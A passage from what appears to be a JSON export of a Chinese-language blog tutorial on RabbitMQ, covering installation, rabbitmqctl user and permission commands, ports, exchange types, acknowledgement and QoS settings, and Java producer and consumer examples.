ACK机制：Rabbitmq提供了交付确认机制，可以设定自动确认交付和手动确认交付。消费者消费消息时的`channel.basicConsume`方法，第二个参数`autoAck`为`true`时表示自动确认交付，为`false`时表示手动确认交付。自动确认交付模式下，消费者从队列消费消息时立即确认交付，这时队列中立即完全删除该消息。手动确认交付模式下，客户端需告诉服务端是否确认交付，共有三种交付状态：ACK、NACK、REJECT，当客户端发送ACK时表示客户端处理成功，这时Rabbitmq才会完全删除，ACK的调用为`channel.basicAck(deliveryTag, false)`。当客户端发送NACK和REJECT时均表示交付失败，区别时NACK能批量操作，REJECT的调用为`channel.basicReject(deliveryTag, false)`，NACK的调用为`channel.basicNack(deliveryTag, true, true)`，NACK和REJECT的最后一个参数均表示交付失败的是否重新进入队列，ACK和NACK的第二个参数均表示是否包含所有未回复的交付（即是否批量回复）。\n\n​        TRANSACTION机制：Rabbitmq在AMQP协议下提供了事务机制，客户端使用`channel.txSelect()`方法开启事务，使用`channel.txCommit()`方法提交事务，使用`channel.txRollback()`方法回滚事务。该机制是重量级的，并且不是必要的，根据官网的说法，它将导致吞吐量降低250倍，因此官方后面添加了也能保证数据不丢失的ACK机制。\n\n### QOS\n\n默认情况下，消费者一次会尽可能多的消费消息（根据客户端内存），设置QOS可以指定一次最高的消费量，可以使用`channel.basicQos(prefetchCount)`方法来设置。\n\n## 7. 可视化界面\n\n`rabbitmq-plugins enable rabbitmq_management`命令用于开启可视化管理界面，之后添加有该权限的用户即可访问15672端口使用 \n\n\n\n## 8. JAVA访问测试\n\nPOM依赖\n\n```\n<dependency>\n\t<groupId>com.rabbitmq</groupId>\n\t<artifactId>amqp-client</artifactId>\n\t<version>5.6.0</version>\n</dependency>\n```\n\n### 简单HelloWorld\n\n基于默认交换机，且不设QOS\n\n生产者\n\n```\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\npublic class Send {\n    private final static String QUEUE_NAME = \"hello\",\n\t\t\tROUTING_KEY = QUEUE_NAME;\n\tprivate static ConnectionFactory factory;\n\tprivate static Connection conn;\n\tprivate static synchronized Channel createConnectChannel() {\n\t\tif (factory == null) {\n\t\t\tfactory = new ConnectionFactory();\n\t\t\tfactory.setHost(\"118.25.54.197\");\n\t\t\tfactory.setVirtualHost(\"test\");\n\t\t\tfactory.setUsername(System.getProperty(\"username\"));\n\t\t\tfactory.setPassword(System.getProperty(\"password\"));\n\t\t}\n\t\tif (conn == null) {\n\t\t\ttry {\n\t\t\t\tconn = factory.newConnection();\n\t\t\t} catch(Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\ttry {\n\t\t\tChannel channel = conn.createChannel();\n\t\t\treturn channel;\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\tthrow new RuntimeException(\"create failed\");\n\t}\n\tprivate static void closeChannel(Channel channel) {\n\t\tif (channel == null || !channel.isOpen()) return;\n\t\tsynchronized (channel) {\n\t\t\tif (channel.isOpen()) {\n\t\t\t\ttry {\n\t\t\t\t\tchannel.close();\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t} catch (TimeoutException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tprivate static synchronized void closeConnection(Channel channel) {\n\t\tcloseChannel(channel);\n\t\tif (conn != null && conn.isOpen()) {\n\t\t\tsynchronized (conn) {\n\t\t\t\tif (conn != null && conn.isOpen()) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconn.close();\n\t\t\t\t\t\tconn = null;\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n    public static void main(String[] argv) throws Exception {\n        Channel channel = createConnectChannel();\n\t\t\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\tSystem.out.println(declare);\n\t\tString message = \"Hello World...\";\n\t\tchannel.basicPublish(\"\", ROUTING_KEY, null, message.getBytes());\n\t\t\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n    }\n}\n```\n\n消费者\n\n```\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.DeliverCallback;\n\npublic class Recv {\n    private final static String QUEUE_NAME = \"hello\";\n    ...\n    public static void main(String[] argv) throws Exception {\n        Channel channel = createConnectChannel();\n\t\t\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\t\n\t\tSystem.out.println(\" [*] Waiting for messages. To exit press CTRL+C\");\n\t\t\n\t\tCountDownLatch cdl = new CountDownLatch(1);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            System.out.println(\" [x] Received '\" + message + \"'\");\n            cdl.countDown();\n        };\n        channel.basicConsume(QUEUE_NAME, true, deliverCallback, consumerTag -> { });\n        \n        cdl.await();\n        closeConnection(channel);\n    }\n}\n```\n\n### 多个消费者\n\n基于设QOS且存在ACK的情况\n\n生产者\n\n```\npublic class RabbitQueueProducer {\n\t...\n\tpublic static void main(String[] args) throws IOException {\n\t\tChannel channel = createConnectChannel();\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tString nextLine = sc.nextLine();\n\t\tsc.close();\n\t\tif (!nextLine.contains(\".\")) nextLine += \".\";\n\n\t\tString message = String.join(\"\", nextLine);\n\t\t\n\t\tchannel.basicPublish(\"\", QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN, message.getBytes());\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n\t}\n}\n```\n\n消费者\n\n```\npublic class RabbitQueueConsumer {\n\t...\n\tprivate static SimpleDateFormat sdf = new SimpleDateFormat(\"HH:mm:ss.SSS\");\n\tprivate static void doWork(String task) {\n\t\tfor (char ch : task.toCharArray()) {\n\t\t\tif (ch == '.') {\n\t\t\t\ttry {\n\t\t\t\t\tThread.sleep(1000l);\n\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t\tThread.currentThread().interrupt();\n\t\t\t\t}\n\t\t\t} \n\t\t}\n\t}\n\t\n\tpublic static void main(String[] args) throws IOException, InterruptedException {\n\t\tChannel channel = createConnectChannel();\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\tThread.sleep(4000l);\n\t\tchannel.basicQos(1);\n\t\tCountDownLatch cdl = new CountDownLatch(1);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            long deliveryTag = delivery.getEnvelope().getDeliveryTag();\n            System.out.println(\" [!] Delivery TAG '\" + deliveryTag + \"'\");\n            System.out.println(\" [x] Received '\" + message + \"'\");\n            try {\n            \tdoWork(message);\n            } catch (Exception e) {\n            \tSystem.out.println(\" [x] Done\");\n            \tchannel.basicNack(delivery.getEnvelope().getDeliveryTag(), false, false);\n            }\n            boolean ack = Math.random() > 0.5;\n            System.out.println(\" [a] ACK '\" + ack + \"' \" + sdf.format(new Date()));\n            if (ack) {\n            \tchannel.basicAck(deliveryTag, false);\n            } else {\n            \tchannel.basicNack(deliveryTag, false, true);\n            }\n            cdl.countDown();\n        };\n        System.out.println(\" [*] Waiting for messages  \" + sdf.format(new Date()));\n        channel.basicConsume(QUEUE_NAME, false, deliverCallback, consumerTag -> {\n        \tSystem.out.println(\" [x] Cancel '\" + consumerTag + \"'\");\n        });\n        cdl.await();\n        closeConnection(channel);\n\t}\n}\n```\n\n### Fanout\n\n生产者\n\n```\npublic class RabbitFanoutProducer {\t\n\tprivate final static String EXCHANGE_NAME = \"fanout\";\n\tprivate final static String ROUTING_KEY = \"\";\n\t...\n\tpublic static void main(String[] args) throws IOException {\n\t\tChannel channel = createConnectChannel();\n\t\t\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tSystem.out.println(\" [!] Enter Message\");\n\t\tString nextLine = sc.nextLine();\n\t\tsc.close();\n\t\tif (!nextLine.contains(\".\")) nextLine += \".\";\n\n\t\tString message = String.join(\"\", nextLine);\n\t\t\n\t\tchannel.basicPublish(EXCHANGE_NAME, ROUTING_KEY, null, message.getBytes());\n\t\t\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n\t}\n}\n```\n\n消费者\n\n```\npublic class RabbitFanoutConsumer {\n\tprivate final static String EXCHANGE_NAME = \"fanout\";\n\tprivate final static String ROUTING_KEY = \"\";\n\t...\n\tpublic static void main(String[] args) throws IOException, InterruptedException {\n\t\tChannel channel = createConnectChannel();\n\t\t\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tSystem.out.println(\" [!] Enter Queue Name\");\n\t\tString queueName = sc.nextLine();\n\t\tsc.close();\n\t\t\n\t\tchannel.queueDeclare(queueName, false, false, false, null);\n\t\tchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);\n\t\tchannel.queueBind(queueName, EXCHANGE_NAME, ROUTING_KEY);\n\t\t\n\t\tSystem.out.println(\" [*] Waiting for messages. To exit press CTRL+C\");\n\t\t\n\t\tCountDownLatch cdl = new CountDownLatch(3);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            \n            System.out.println(\" [x] Received '\" + message + \"'\");\n            cdl.countDown();\n        };\n        channel.basicConsume(queueName, true, deliverCallback, consumerTag -> { });\n\n        \n        cdl.await();\n        closeConnection(channel);\n\t}\n}\n```\n\n","source":"_posts/2019-04-22_rabbitmq.md","raw":"---\ntitle: RabbitMQ快速入门手册\ndate: 2019-04-22 17:01:43\ntags: RabbitMQ\npermalink: rabbitmq\nkeywords: rabbitmq, 教程，安装\nrId: MB-19042201\n---\n\n## 1. 安装\n\n使用docker方式，拉取镜像uetty/rabbitmq\n\n具体Dockerfile的命令 -> [Dockerfile](<https://github.com/Uetty/dockerfile/blob/master/docker-rabbitmq/Dockerfile>)\n\n\n\n额外的TIP: 由于Linux机器上会有最大打开文件个数限制，Rabbitmq又依赖文件操作，所以应将Linux的所有用户打开文件限制调高到64000，Rabbitmq程序所属的用户的打开文件限制调高到64000，这一块见官网（[文件限制](https://www.rabbitmq.com/install-debian.html#kernel-resource-limits)）\n\n\n\n## 2. 虚拟主机\n\nRabbitmq是多租户系统，存在虚拟主机（把它想象成为数据库）的概念，用户对它的连接、队列、绑定、路由等操作是基于虚拟主机上的。通过`rabbitmqctl add_vhost vhostname`命令来增加虚拟主机，`rabbitmqctl delete_vhost vhostname`命令来删除虚拟主机，`rabbitmqctl list_vhosts [name tracing]`命令来显示虚拟主机列表。\n\n设置虚拟主机并发客户端总数：`rabbitmqctl set_vhost_limits -p test '{\"max-connections\": 256}'`\n\n设置虚拟主机最大队列数：`rabbitmqctl set_vhost_limits -p test '{\"max-queues\": 1024}'`\n\n显示虚拟主机参数：`rabbitmqctl list_vhost_limits -p test`\n\n## 3. 启动与用户操作及权限\n\n启动命令：`service rabbitmq-server start`  \n\nRabbit提供了用户名密码的方式认证和X509证书的方式认证，，这里只记用户名密码的方式 \n\n初始用户：刚创建的实例，有默认的用户guest密码guest，但只能在本机登陆（不鼓励将其配置成能远程登陆，其他用户默认是可以远程访问的） \n\n### 用户设置（[官网地址](https://www.rabbitmq.com/rabbitmqctl.8.html#User_Management) ）\n\n添加用户：`rabbitmqctl add_user janeway changeit` \n\n删除用户：`rabbitmqctl delete_user janeway` \n\n变更密码：`rabbitmqctl change_password janeway newpass` \n\n验证用户名密码：`rabbitmqctl authenticate_user janeway verifyit` \n\n显示用户列表：`rabbitmqctl list_users` \n\n### 用户权限\n\n设置用户TAG：`rabbitmqctl set_user_tags janeway administrator` \n\n删除用户TAG：`rabbitmqctl set_user_tags janeway` \n\nTIP: 用户TAG与全局权限绑定（包括登陆可视化管理界面的权限等），具体见官网（[TAG权限表](<https://www.rabbitmq.com/management.html#permissions>)）\n\n| Tag           | Capabilities                                                 |\n| :------------ | :----------------------------------------------------------- |\n| (None)        | No access to the management plugin                           |\n| management    | Anything the user could do via messaging protocols plus:List virtual hosts to which they can log in via AMQPView all queues, exchanges and bindings in \"their\" virtual hostsView and close their own channels and connectionsView \"global\" statistics covering all their virtual hosts, including activity by other users within them |\n| policymaker   | Everything \"management\" can plus:View, create and delete policies and parameters for virtual hosts to which they can log in via AMQP |\n| monitoring    | Everything \"management\" can plus:List all virtual hosts, including ones they could not access using messaging protocolsView other users's connections and channelsView node-level data such as memory use and clusteringView truly global statistics for all virtual hosts |\n| administrator | Everything \"policymaker\" and \"monitoring\" can plus:Create and delete virtual hostsView, create and delete usersView, create and delete permissionsClose other users's connections |\n\n设置用户在虚拟主机上的权限：`rabbitmqctl set_permissions -p vhostname username \".*\" \".*\" \".*\"` 后面三个参数分别表示配置权限、写权限、读权限，引号内的内容用正则表达式匹配队列键名（不指定[--vhost/-p]参数，默认主机为'/' ，下同） \n\n清除用户在虚拟主机上的权限：` rabbitmqctl clear_permissions -p vhostname username`  \n\n显示某个用户在虚拟主机上的权限：` rabbitmqctl list_user_permissions uetty`  \n\n显示某个虚拟主机上的用户权限：`rabbitmqctl list_permissions -p vhostname`\n\n## 4. 端口介绍\n\n- 4369: [epmd](http://erlang.org/doc/man/epmd.html), a peer discovery service used by RabbitMQ nodes and CLI tools\n- 5672, 5671: used by AMQP 0-9-1 and 1.0 clients without and with TLS\n- 25672: used for inter-node and CLI tools communication (Erlang distribution server port) and is allocated from a dynamic range (limited to a single port by default, computed as AMQP port + 20000). Unless external connections on these ports are really necessary (e.g. the cluster uses [federation](https://www.rabbitmq.com/federation.html) or CLI tools are used on machines outside the subnet), these ports should not be publicly exposed. See [networking guide](https://www.rabbitmq.com/networking.html) for details.\n- 35672-35682: used by CLI tools (Erlang distribution client ports) for communication with nodes and is allocated from a dynamic range (computed as server distribution port + 10000 through server distribution port + 10010). See [networking guide](https://www.rabbitmq.com/networking.html) for details.\n- 15672: [HTTP API](https://www.rabbitmq.com/management.html) clients, [management UI](https://www.rabbitmq.com/management.html) and [rabbitmqadmin](https://www.rabbitmq.com/management-cli.html) (only if the [management plugin](https://www.rabbitmq.com/management.html) is enabled)\n- 61613, 61614: [STOMP clients](https://stomp.github.io/stomp-specification-1.2.html) without and with TLS (only if the [STOMP plugin](https://www.rabbitmq.com/stomp.html) is enabled)\n- 1883, 8883: ([MQTT clients](http://mqtt.org/) without and with TLS, if the [MQTT plugin](https://www.rabbitmq.com/mqtt.html) is enabled\n- 15674: STOMP-over-WebSockets clients (only if the [Web STOMP plugin](https://www.rabbitmq.com/web-stomp.html) is enabled)\n- 15675: MQTT-over-WebSockets clients (only if the [Web MQTT plugin](https://www.rabbitmq.com/web-mqtt.html) is enabled)\n\n5671端口：AMQP协议使用，且TLS加密\n\n5672端口：AMQP协议使用，且不加密\n\n15672端口：HTTP协议使用，或者开启可视化管理页面后，页面地址所在端口\n\n61613端口：STOMP协议使用，且不加密\n\n61614端口：STOMP协议使用，且TLS加密\n\n1883端口：MQTT协议使用，且不加密\n\n8883端口：MQTT协议使用，且TLS加密\n\n15674端口：Websocket协议上的STOMP协议使用\n\n15675端口：Websocket协议上的MQTT协议使用\n\n\n\nTIP:  较常用的是5672端口（一般选择AMQP协议，有加密需求的化是5671端口）和15672端口\n\n## 5. 交换机、队列与消息的路由\n\n在Rabbitmq中，生产者是将消息推送到交换机里，交换机负责将消息路由到队列中，消费者再从队列中消费消息。这里涉及到了两个概念，`交换机`和`队列`，在此基础上引申出了三个操作：`交换机的声明`、`队列的声明`、`交换机和队列绑定的声明`，这三个操作的完成是基于`交换机名`、`队列名`、`路由键`这三个属性的。\n\n```\n1) 通过channel.exchangeDeclare(\"exchangeName\", BuiltinExchangeType.类型);声明交换机\n2) 通过String queueName = channel.queueDeclare().getQueue();声明队列，并返回自动生成的队列的名称\n   也可以通过channel.queueDeclare(queueName, durable, exclusive, autoDelete, arguments);声明命名的队列\n   第二种声明方式的参数解释：durable为是否持久化到磁盘，它将使服务器重启后数据仍然存在；exclusive为是否排他队列，具有基于连接的排他性；autoDelete是否自动删除，在没有订阅者的情况下是否自动删除\n3) 通过channel.queueBind(queueName, \"exchangeName\", \"routingKey\");绑定队列和交换机\n```\n\nTIP:  队列本身还包含了许多属性，例如：名称、交换代理重启后是否仍保存、自动删除、队列长度等参数，在声明队列的时候可以给定。\n\n\n\n交换机种类主要有四种，以下介绍这几种交换机：\n\n1.  直连交换机(direct)\n\n```\n在直连交换机的三个声明操作中，交换机名、队列名都是不能为空字符串，路由键可以为空字符串但已被使用。发送到直连交换机的消息直接根据路由键进行完全匹配，将消息路由到所有以该路由键与该交换机绑定的队列中。\n\n1) 生产者通过channel.basicPublish(\"exchangeName\", routingKey, null, message.getBytes(\"UTF-8\"));提交数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n2.  扇形交换机(fanout)\n\n```\n该交换机的设计思想是一个消息广播，在扇形交换机的三个声明操作中，路由键名可以为空字符串（事实上它会被忽略）。发送到扇形交换机的消息，会被路由到所有绑定在该交换机上的队列中（与直连交换机不同的是不再根据路由键进行筛选）。\n\n1) 生产者通过channel.basicPublish(\"exchangeName\", \"\", null, message.getBytes(\"UTF-8\"));提交数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n3.  主题交换机(topic)\n\n```\n在主题交换机的三个声明中，路由键的命名是受限制的，必须由点号分割的多个单词或星号或井号组成，*用于匹配一个单词，井号用于匹配零到多个单词，发送到主题交换机的消息，会根据路由键匹配来路由到队列中。\n\n1) 生产者通过channel.basicPublish(EXCHANGE_NAME, routingKey, null, message.getBytes(\"UTF-8\"));发送数据到Rabbitmq\n\n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n4.  首部交换机(match 和 headers)\n\n```\n在首部交换机中，路由键名可以是空字符串（事实上它会被忽略），它的路由规则转而由首部属性决定，其中最重要的一个属性是x-match，该属性有两个取值（any/all）,any表示发布消息时携带的键值对有一对能匹配上队列定义的其中一个就能，all表示所有的键值对需完全匹配。另外以x-开头的属性不被视作用于路由匹配的属性。\n该模式下，交换机和队列绑定需要增加headers值，可通过如下设置：\nMap<String, Object> arguments = new HashMap<String, Object>();\narguments.put(\"x-match\", \"any\");\narguments.put(\"arg1\", \"a1\");\narguments.put(\"latitude\", 51.5252949);\narguments.put(\"dataType\", \"json\");\nchannel.queueBind(queueName, EXCHANGE_NAME, \"\", arguments);\n\n使用：\n1) 生产者通过如下代码发送消息到Rabbitmq\nMap<String, Object> headers = new HashMap<String, Object>();\nheaders.put(\"latitude\",  51.5252949);\nheaders.put(\"longitude\", -0.0905493);\nchannel.basicPublish(exchangeName, \"\",\n             new AMQP.BasicProperties.Builder()\n               .headers(headers)\n               .build(),\n               message.getBytes(\"UTF-8\"));\n               \n2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -> {}, consumerTag -> { });从Rabbitmq消费消息\n```\n\n默认交换机规则是一个空字符串路由键的直连交换机定义[官网](<https://www.rabbitmq.com/tutorials/amqp-concepts.html#exchange-default>)，该交换机的路由键与队列键名相同，这使其看起来像是客户端直接提交消息到了队列中。所有新建的队列都天生绑定了这个默认交换机，它的存在也方便了一些简单需求的应用直接使用Rabbitmq。\n\n\n\n## 6. ACK、TRANSACTION、RECOVERY和QOS\n\n### ACK、TRANSACTION和RECOVERY\n\n​        消费者消费队列消息时，过程中可能由于网络原因或业务原因，出现连接断开或者消费者未接收到消息或者消费者不能成功处理消息，这个时候可能会导致数据的丢失。基于这一点，Rabbitmq提供了，TRANSACRION机制、ACK机制和RECOVERY机制。\n\n​        RECOVERY机制：Rabbitmq JAVA客户端提供连接恢复的功能，在启用该功能时，当客户端由于网络问题断开，会自动恢复客户端，包括恢复连接、恢复连接监听器、重新打开信道及监听器、恢复QOS设置、重新声明交换机、重新声明队列、恢复绑定和消费者，可以通过`factory.setAutomaticRecoveryEnabled(true)`来打开RECOVERY机制。\n\n​        ACK机制：Rabbitmq提供了交付确认机制，可以设定自动确认交付和手动确认交付。消费者消费消息时的`channel.basicConsume`方法，第二个参数`autoAck`为`true`时表示自动确认交付，为`false`时表示手动确认交付。自动确认交付模式下，消费者从队列消费消息时立即确认交付，这时队列中立即完全删除该消息。手动确认交付模式下，客户端需告诉服务端是否确认交付，共有三种交付状态：ACK、NACK、REJECT，当客户端发送ACK时表示客户端处理成功，这时Rabbitmq才会完全删除，ACK的调用为`channel.basicAck(deliveryTag, false)`。当客户端发送NACK和REJECT时均表示交付失败，区别时NACK能批量操作，REJECT的调用为`channel.basicReject(deliveryTag, false)`，NACK的调用为`channel.basicNack(deliveryTag, true, true)`，NACK和REJECT的最后一个参数均表示交付失败的是否重新进入队列，ACK和NACK的第二个参数均表示是否包含所有未回复的交付（即是否批量回复）。\n\n​        TRANSACTION机制：Rabbitmq在AMQP协议下提供了事务机制，客户端使用`channel.txSelect()`方法开启事务，使用`channel.txCommit()`方法提交事务，使用`channel.txRollback()`方法回滚事务。该机制是重量级的，并且不是必要的，根据官网的说法，它将导致吞吐量降低250倍，因此官方后面添加了也能保证数据不丢失的ACK机制。\n\n### QOS\n\n默认情况下，消费者一次会尽可能多的消费消息（根据客户端内存），设置QOS可以指定一次最高的消费量，可以使用`channel.basicQos(prefetchCount)`方法来设置。\n\n## 7. 可视化界面\n\n`rabbitmq-plugins enable rabbitmq_management`命令用于开启可视化管理界面，之后添加有该权限的用户即可访问15672端口使用 \n\n\n\n## 8. JAVA访问测试\n\nPOM依赖\n\n```\n<dependency>\n\t<groupId>com.rabbitmq</groupId>\n\t<artifactId>amqp-client</artifactId>\n\t<version>5.6.0</version>\n</dependency>\n```\n\n### 简单HelloWorld\n\n基于默认交换机，且不设QOS\n\n生产者\n\n```\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\npublic class Send {\n    private final static String QUEUE_NAME = \"hello\",\n\t\t\tROUTING_KEY = QUEUE_NAME;\n\tprivate static ConnectionFactory factory;\n\tprivate static Connection conn;\n\tprivate static synchronized Channel createConnectChannel() {\n\t\tif (factory == null) {\n\t\t\tfactory = new ConnectionFactory();\n\t\t\tfactory.setHost(\"118.25.54.197\");\n\t\t\tfactory.setVirtualHost(\"test\");\n\t\t\tfactory.setUsername(System.getProperty(\"username\"));\n\t\t\tfactory.setPassword(System.getProperty(\"password\"));\n\t\t}\n\t\tif (conn == null) {\n\t\t\ttry {\n\t\t\t\tconn = factory.newConnection();\n\t\t\t} catch(Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\ttry {\n\t\t\tChannel channel = conn.createChannel();\n\t\t\treturn channel;\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\tthrow new RuntimeException(\"create failed\");\n\t}\n\tprivate static void closeChannel(Channel channel) {\n\t\tif (channel == null || !channel.isOpen()) return;\n\t\tsynchronized (channel) {\n\t\t\tif (channel.isOpen()) {\n\t\t\t\ttry {\n\t\t\t\t\tchannel.close();\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t} catch (TimeoutException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tprivate static synchronized void closeConnection(Channel channel) {\n\t\tcloseChannel(channel);\n\t\tif (conn != null && conn.isOpen()) {\n\t\t\tsynchronized (conn) {\n\t\t\t\tif (conn != null && conn.isOpen()) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconn.close();\n\t\t\t\t\t\tconn = null;\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n    public static void main(String[] argv) throws Exception {\n        Channel channel = createConnectChannel();\n\t\t\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\tSystem.out.println(declare);\n\t\tString message = \"Hello World...\";\n\t\tchannel.basicPublish(\"\", ROUTING_KEY, null, message.getBytes());\n\t\t\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n    }\n}\n```\n\n消费者\n\n```\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.DeliverCallback;\n\npublic class Recv {\n    private final static String QUEUE_NAME = \"hello\";\n    ...\n    public static void main(String[] argv) throws Exception {\n        Channel channel = createConnectChannel();\n\t\t\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\t\n\t\tSystem.out.println(\" [*] Waiting for messages. To exit press CTRL+C\");\n\t\t\n\t\tCountDownLatch cdl = new CountDownLatch(1);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            System.out.println(\" [x] Received '\" + message + \"'\");\n            cdl.countDown();\n        };\n        channel.basicConsume(QUEUE_NAME, true, deliverCallback, consumerTag -> { });\n        \n        cdl.await();\n        closeConnection(channel);\n    }\n}\n```\n\n### 多个消费者\n\n基于设QOS且存在ACK的情况\n\n生产者\n\n```\npublic class RabbitQueueProducer {\n\t...\n\tpublic static void main(String[] args) throws IOException {\n\t\tChannel channel = createConnectChannel();\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tString nextLine = sc.nextLine();\n\t\tsc.close();\n\t\tif (!nextLine.contains(\".\")) nextLine += \".\";\n\n\t\tString message = String.join(\"\", nextLine);\n\t\t\n\t\tchannel.basicPublish(\"\", QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN, message.getBytes());\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n\t}\n}\n```\n\n消费者\n\n```\npublic class RabbitQueueConsumer {\n\t...\n\tprivate static SimpleDateFormat sdf = new SimpleDateFormat(\"HH:mm:ss.SSS\");\n\tprivate static void doWork(String task) {\n\t\tfor (char ch : task.toCharArray()) {\n\t\t\tif (ch == '.') {\n\t\t\t\ttry {\n\t\t\t\t\tThread.sleep(1000l);\n\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t\tThread.currentThread().interrupt();\n\t\t\t\t}\n\t\t\t} \n\t\t}\n\t}\n\t\n\tpublic static void main(String[] args) throws IOException, InterruptedException {\n\t\tChannel channel = createConnectChannel();\n\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);\n\t\tThread.sleep(4000l);\n\t\tchannel.basicQos(1);\n\t\tCountDownLatch cdl = new CountDownLatch(1);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            long deliveryTag = delivery.getEnvelope().getDeliveryTag();\n            System.out.println(\" [!] Delivery TAG '\" + deliveryTag + \"'\");\n            System.out.println(\" [x] Received '\" + message + \"'\");\n            try {\n            \tdoWork(message);\n            } catch (Exception e) {\n            \tSystem.out.println(\" [x] Done\");\n            \tchannel.basicNack(delivery.getEnvelope().getDeliveryTag(), false, false);\n            }\n            boolean ack = Math.random() > 0.5;\n            System.out.println(\" [a] ACK '\" + ack + \"' \" + sdf.format(new Date()));\n            if (ack) {\n            \tchannel.basicAck(deliveryTag, false);\n            } else {\n            \tchannel.basicNack(deliveryTag, false, true);\n            }\n            cdl.countDown();\n        };\n        System.out.println(\" [*] Waiting for messages  \" + sdf.format(new Date()));\n        channel.basicConsume(QUEUE_NAME, false, deliverCallback, consumerTag -> {\n        \tSystem.out.println(\" [x] Cancel '\" + consumerTag + \"'\");\n        });\n        cdl.await();\n        closeConnection(channel);\n\t}\n}\n```\n\n### Fanout\n\n生产者\n\n```\npublic class RabbitFanoutProducer {\t\n\tprivate final static String EXCHANGE_NAME = \"fanout\";\n\tprivate final static String ROUTING_KEY = \"\";\n\t...\n\tpublic static void main(String[] args) throws IOException {\n\t\tChannel channel = createConnectChannel();\n\t\t\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tSystem.out.println(\" [!] Enter Message\");\n\t\tString nextLine = sc.nextLine();\n\t\tsc.close();\n\t\tif (!nextLine.contains(\".\")) nextLine += \".\";\n\n\t\tString message = String.join(\"\", nextLine);\n\t\t\n\t\tchannel.basicPublish(EXCHANGE_NAME, ROUTING_KEY, null, message.getBytes());\n\t\t\n\t\tSystem.out.println(\" [x] Sent '\" + message + \"'\");\n\t\tcloseConnection(channel);\n\t}\n}\n```\n\n消费者\n\n```\npublic class RabbitFanoutConsumer {\n\tprivate final static String EXCHANGE_NAME = \"fanout\";\n\tprivate final static String ROUTING_KEY = \"\";\n\t...\n\tpublic static void main(String[] args) throws IOException, InterruptedException {\n\t\tChannel channel = createConnectChannel();\n\t\t\n\t\t\n\t\tScanner sc = new Scanner(System.in);\n\t\tSystem.out.println(\" [!] Enter Queue Name\");\n\t\tString queueName = 